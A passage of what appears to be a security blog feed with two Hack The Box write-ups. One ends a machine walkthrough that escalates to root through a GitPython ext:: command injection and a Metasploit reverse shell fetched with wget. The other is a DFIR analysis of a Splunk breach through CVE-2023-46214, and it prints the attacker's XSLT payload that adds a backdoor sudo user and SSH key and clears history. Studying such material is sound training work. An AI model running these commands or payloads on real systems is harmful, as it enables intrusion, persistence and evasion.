<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> git <span style="color:#ff79c6">import</span> Repo
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> Repo<span style="color:#ff79c6">.</span>init(<span style="color:#f1fa8c">&#39;&#39;</span>, bare<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>clone_from(<span style="color:#f1fa8c">&#39;ext::sh -c touch% /tmp/pwned&#39;</span>, <span style="color:#f1fa8c">&#39;tmp&#39;</span>, multi_options<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span>])
</span></span></code></pre></div><p>We found our PE vector. To exploit it I used the <code>msfconsole</code>&rsquo;s web delivery module and set payload to <code>linux/x64/shell/reverse_tcp</code>. And I uploaded the payload to the <code>prod</code> user&rsquo;s home directory.</p>
<p>Metasploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 10.10.14.50:4444 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using URL: http://10.10.14.50:8080/DHmVwiq
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Server started.
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
</span></span></code></pre></div><p>Executing the payload using the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#f1fa8c">&#39;ext::sh -c /home/prod/kKqgpCZC&#39;</span>
</span></span></code></pre></div><p>Metasploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.145    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.146    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">38</span> bytes<span style="color:#ff79c6">)</span> to 10.129.76.146
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command shell session <span style="color:#bd93f9">3</span> opened <span style="color:#ff79c6">(</span>10.10.14.50:4444 -&gt; 10.129.76.146:34428<span style="color:#ff79c6">)</span> at 2024-06-18 18:33:50 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Active <span style="color:#8be9fd;font-style:italic">sessions</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Id  Name  Type             Information  Connection
</span></span><span style="display:flex;"><span>  --  ----  ----             -----------  ----------
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">3</span>         shell x64/linux               10.10.14.50:4444 -&gt; 10.129.76.146:34428 <span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>                                          10.129.76.146<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions -i <span style="color:#bd93f9">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Starting interaction with 3...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>We successfully rooted the box.</p>
]]></description></item><item><title>HTB Sherlock Fragility</title><link>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</link><pubDate>Sat, 15 Jun 2024 04:15:59 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</guid><description><![CDATA[<h1 id="fragility-dfir">Fragility (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>fragility.zip</td>
<td>e1d81df86e9201f99051c713620fb6c6</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>capture.pcapng</td>
<td>636aa4c094866c852fdebcb1c65d5944</td>
<td>n/a</td>
</tr>
<tr>
<td>Challenge.7z</td>
<td>c1ebd1edb34e2953356b5200ecc673ac</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>Wireshark - PCAP Analysis</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>After acquiring the artifacts, I analyzed the PCAP file using Wireshark and exported the HTTP Objects. I found several suspicious requests two of them stands out the most.</p>
<p>The attacker uploaded a malicious <code>XSLT</code> file to the Splunk Server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>XSLT (eXtensible Stylesheet Language Transformations) is the recommended style sheet language for XML. XSLT is far more sophisticated than CSS. With XSLT you can add/remove elements and attributes to or from the output file.
</span></span></code></pre></div><p><img src="images/20240615092924.png" alt="alt text"></p>
<p>The file contained the following payload inside it.</p>
<p><strong>search.xsl</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;xsl:stylesheet</span> <span style="color:#50fa7b">version=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#50fa7b">xmlns:xsl=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style="color:#50fa7b">xmlns:exsl=</span><span style="color:#f1fa8c">&#34;http://exslt.org/common&#34;</span> <span style="color:#50fa7b">extension-element-prefixes=</span><span style="color:#f1fa8c">&#34;exsl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;xsl:template</span> <span style="color:#50fa7b">match=</span><span style="color:#f1fa8c">&#34;/&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;exsl:document</span> <span style="color:#50fa7b">href=</span><span style="color:#f1fa8c">&#34;/opt/splunk/bin/scripts/search.sh&#34;</span> <span style="color:#50fa7b">method=</span><span style="color:#f1fa8c">&#34;text&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;xsl:text&gt;</span>#!/bin/bash&amp;#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&amp;#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&amp;#10;echo &amp;quot;nginx:$access&amp;quot; | chpasswd&amp;#10;usermod -aG sudo nginx&amp;#10;mkdir /var/www/.ssh&amp;#10;echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&amp;quot; &amp;gt; /var/www/.ssh/authorized_keys&amp;#10;chown -R nginx:nginx /var/www/&amp;#10;cat /dev/null &amp;gt; /root/.bash_history<span style="color:#ff79c6">&lt;/xsl:text&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/exsl:document&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/xsl:template&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/xsl:stylesheet&gt;</span>
</span></span></code></pre></div><p>Then the TA used Splunks SPL Query Language to execute the payload.
<img src="images/20240615093453.png" alt="alt text"></p>
<p>Apparently, the TA exploited <a href="https://www.cvedetails.com/cve/CVE-2023-46214/">CVE-2023-46214</a> to compromise the Splunk Server. According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46214">NIST</a>: <em>In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.</em></p>
<p>The Splunk Server version was <code>9.0.5</code>. We can confirm this by the following data.
<img src="images/20240615094425.png" alt="alt text"></p>
<p>It&rsquo;s an authenticated remote code execution vulnerability, and the TA used the following credential to log into the Splunk Admin Panel.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>username=johnnyC
</span></span><span style="display:flex;"><span>password=h3Re15j0hnNy
</span></span></code></pre></div><p>Some how the credential was stolen by the TA.</p>
<p>To search for the default time that was before and the default time that was set after, I took a look inside the <code>/var/log</code> directory. And I found two files that seemed archived log.</p>
<p><strong>vmware-network.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main resume-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ WakeNetworkManager
</span></span><span style="display:flex;"><span>+ which dbus-send
</span></span><span style="display:flex;"><span>+ dbusSend=/usr/bin/dbus-send
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Enable boolean:true
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyEnabledOrDisabled: Already enabled
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Sleep boolean:false
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyAsleepOrAwake: Already awake
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.wake
</span></span><span style="display:flex;"><span>Error org.freedesktop.DBus.Error.UnknownMethod: No such method “wake”
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ return 1
</span></span><span style="display:flex;"><span>+ exitCode=1
</span></span><span style="display:flex;"><span>+ [ 1 != 0 ]
</span></span><span style="display:flex;"><span>+ sanity_check resume-vm
</span></span><span style="display:flex;"><span>+ which ip
</span></span><span style="display:flex;"><span>+ ip_cmd=/usr/sbin/ip
</span></span><span style="display:flex;"><span>+ which ifconfig
</span></span><span style="display:flex;"><span>+ ifconfig_cmd=
</span></span><span style="display:flex;"><span>+ which ifup
</span></span><span style="display:flex;"><span>+ ifup_cmd=
</span></span><span style="display:flex;"><span>+ which ifdown
</span></span><span style="display:flex;"><span>+ ifdown_cmd=
</span></span><span style="display:flex;"><span>+ [ -z  -a -z /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ [ ! -s /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ save_active_NIC_list
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ 
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show up
</span></span><span style="display:flex;"><span>+ egrep \bUP\b
</span></span><span style="display:flex;"><span>+ awk -F: {print $2}
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show lo
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33
</span></span><span style="display:flex;"><span>+ echo ens33
</span></span><span style="display:flex;"><span>+ run_network_script start
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local script
</span></span><span style="display:flex;"><span>+ true
</span></span><span style="display:flex;"><span>+ exec_systemctl_service start
</span></span><span style="display:flex;"><span>+ local rc=1
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ which systemctl
</span></span><span style="display:flex;"><span>+ local ctlcmd=/usr/bin/systemctl
</span></span><span style="display:flex;"><span>+ local service
</span></span><span style="display:flex;"><span>+ [ -z /usr/bin/systemctl ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl status systemd-networkd
</span></span><span style="display:flex;"><span>+ grep -iq not-found
</span></span><span style="display:flex;"><span>+ service=systemd-networkd
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ [ -z systemd-networkd ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl start systemd-networkd
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 -a systemd-networkd = systemd-networkd -a start = stop ]
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ [ 0 != 0 ]
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ rescue_NIC
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ [ -f /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33 up
</span></span><span style="display:flex;"><span>+ intf_out=2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
</span></span><span style="display:flex;"><span>    link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    altname enp2s1
</span></span><span style="display:flex;"><span>+ grep -q UP
</span></span><span style="display:flex;"><span>+ echo 2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff altname enp2s1
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span></code></pre></div><p>Found the current Timezone offset which is <code>+07</code>.</p>
<p><strong>vmware-network.2.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main poweron-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span></code></pre></div><p>We were also able to find the previous Timezone that was set to <code>PDT</code>. Using <a href="https://www.epochconverter.com/timezones">Epoch Converter</a> I was able to find the <code>PDT</code> timezone&rsquo;s offset which were <code>-07</code></p>
<p><img src="images/20240615104930.png" alt="alt text"></p>
<p>Next up we need to calculate the dwell time for <code>nginx</code> user creation to SSH logout session.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat auth.log | grep -i nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/gshadow: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: new group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu useradd<span style="color:#ff79c6">[</span>13364<span style="color:#ff79c6">]</span>: new user: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">UID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">home</span><span style="color:#ff79c6">=</span>/var/www/, <span style="color:#8be9fd;font-style:italic">shell</span><span style="color:#ff79c6">=</span>/bin/bash, <span style="color:#8be9fd;font-style:italic">from</span><span style="color:#ff79c6">=</span>none
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13376<span style="color:#ff79c6">]</span>: change user <span style="color:#f1fa8c">&#39;nginx&#39;</span> password
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chfn<span style="color:#ff79c6">[</span>13383<span style="color:#ff79c6">]</span>: changed user <span style="color:#f1fa8c">&#39;nginx&#39;</span> information
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chpasswd<span style="color:#ff79c6">[</span>13394<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>chpasswd:chauthtok<span style="color:#ff79c6">)</span>: password changed <span style="color:#ff79c6">for</span> nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to shadow group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: Accepted publickey <span style="color:#ff79c6">for</span> nginx from 192.168.222.130 port <span style="color:#bd93f9">43302</span> ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu systemd-logind<span style="color:#ff79c6">[</span>673<span style="color:#ff79c6">]</span>: New session <span style="color:#bd93f9">7</span> of user nginx.
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:22 ubuntu systemd: pam_unix<span style="color:#ff79c6">(</span>systemd-user:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf search.sh
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/su
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: <span style="color:#ff79c6">(</span>to root<span style="color:#ff79c6">)</span> nginx on pts/2
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: pam_unix<span style="color:#ff79c6">(</span>su:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
